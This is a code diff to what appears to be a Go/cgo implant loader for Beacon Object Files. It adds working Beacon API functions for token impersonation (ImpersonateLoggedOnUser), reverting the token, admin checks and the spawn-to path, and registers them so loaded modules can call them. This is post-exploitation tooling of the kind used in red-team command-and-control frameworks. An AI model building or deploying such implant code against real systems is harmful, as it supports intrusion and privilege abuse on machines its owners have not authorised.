@@ -150,6 +150,23 @@ static void beacon_printf_error(char* fmt, ...) {
     }
 }
 
+// ===== Beacon API Wrappers (C-side, callable from BOF) =====
+// These wrap Go implementations via exported functions.
+
+// exported Go functions
+extern int  beacon_use_token_impl(HANDLE token);
+extern int  beacon_revert_token_impl(void);
+extern int  beacon_is_admin_impl(void);
+extern void beacon_cleanup_process_impl(HANDLE process);
+extern void beacon_get_spawn_to_impl(char* buf, int buf_len);
+
+// Beacon API wrappers — defined in bof.c, declared here for CGO
+extern int beacon_use_token(HANDLE token);
+extern int beacon_revert_token(void);
+extern int beacon_is_admin(void);
+extern void beacon_cleanup_process(HANDLE h);
+extern void beacon_get_spawn_to(char* b, int l);
+
 // ===== BOF 入口调用 =====
 extern void bof_call_entry(LPVOID entry, char* args, int args_len);
 */
@@ -207,6 +224,63 @@ func beacon_output(cType C.int, data *C.char, length C.int) {
 	}
 }
 
+// ===== Beacon API Go 实现 =====
+
+//export beacon_use_token_impl
+func beacon_use_token_impl(token C.HANDLE) C.int {
+	h := windows.Handle(uintptr(unsafe.Pointer(token)))
+	advapi32 := syscall.NewLazyDLL("advapi32.dll")
+	proc := advapi32.NewProc("ImpersonateLoggedOnUser")
+	ret, _, _ := proc.Call(uintptr(h))
+	if ret == 0 {
+		return 0
+	}
+	return 1
+}
+
+//export beacon_revert_token_impl
+func beacon_revert_token_impl() C.int {
+	if err := windows.RevertToSelf(); err != nil {
+		return 0
+	}
+	return 1
+}
+
+//export beacon_is_admin_impl
+func beacon_is_admin_impl() C.int {
+	var sid *windows.SID
+	if err := windows.AllocateAndInitializeSid(
+		&windows.SECURITY_NT_AUTHORITY,
+		2,
+		windows.SECURITY_BUILTIN_DOMAIN_RID,
+		windows.DOMAIN_ALIAS_RID_ADMINS,
+		0, 0, 0, 0, 0, 0,
+		&sid,
+	); err != nil {
+		return 0
+	}
+	defer windows.FreeSid(sid)
+
+	token := windows.Token(0) // current process token
+	isAdmin, _ := token.IsMember(sid)
+	if isAdmin {
+		return 1
+	}
+	return 0
+}
+
+//export beacon_cleanup_process_impl
+func beacon_cleanup_process_impl(process C.HANDLE) {
+	windows.CloseHandle(windows.Handle(uintptr(unsafe.Pointer(process))))
+}
+
+//export beacon_get_spawn_to_impl
+func beacon_get_spawn_to_impl(buf *C.char, bufLen C.int) {
+	defaultPath := "C:\\Windows\\System32\\cmd.exe"
+	n := copy((*[1 << 30]byte)(unsafe.Pointer(buf))[:int(bufLen):int(bufLen)], defaultPath)
+	(*[1 << 30]byte)(unsafe.Pointer(buf))[n] = 0
+}
+
 // ===== Beacon API 实现 =====
 
 // BeaconAPI 是 BOF 可解析的 API 映射。
@@ -225,12 +299,11 @@ func BeaconAPI() map[string]uint64 {
 		"BeaconFormatToString":  0,
 		"BeaconPrintf":          0,
 		"BeaconPrintfError":     0,
-		"BeaconUseToken":        uint64(0),
-		"BeaconRevertToken":     uint64(0),
-		"BeaconIsAdmin":         uint64(0),
-		"BeaconGetSpawnTo":      uint64(0),
-		"BeaconCleanupProcess":  uint64(0),
-		"BeaconInjectProcess":   uint64(0),
+		"BeaconUseToken":        uint64(uintptr(C.beacon_use_token)),
+		"BeaconRevertToken":     uint64(uintptr(C.beacon_revert_token)),
+		"BeaconIsAdmin":         uint64(uintptr(C.beacon_is_admin)),
+		"BeaconGetSpawnTo":      uint64(uintptr(C.beacon_get_spawn_to)),
+		"BeaconCleanupProcess":  uint64(uintptr(C.beacon_cleanup_process)),
 		"toWideChar":            uint64(0),
 	}
 }
@@ -310,6 +383,13 @@ func defaultBofAPIs() bofAPIMap {
 			apis[beaconName] = addr
 		}
 	}
+
+	// Beacon API — C wrappers calling Go implementations
+	apis["BeaconUseToken"] = uintptr(C.beacon_use_token)
+	apis["BeaconRevertToken"] = uintptr(C.beacon_revert_token)
+	apis["BeaconIsAdmin"] = uintptr(C.beacon_is_admin)
+	apis["BeaconCleanupProcess"] = uintptr(C.beacon_cleanup_process)
+	apis["BeaconGetSpawnTo"] = uintptr(C.beacon_get_spawn_to)
 
 	return apis
 }
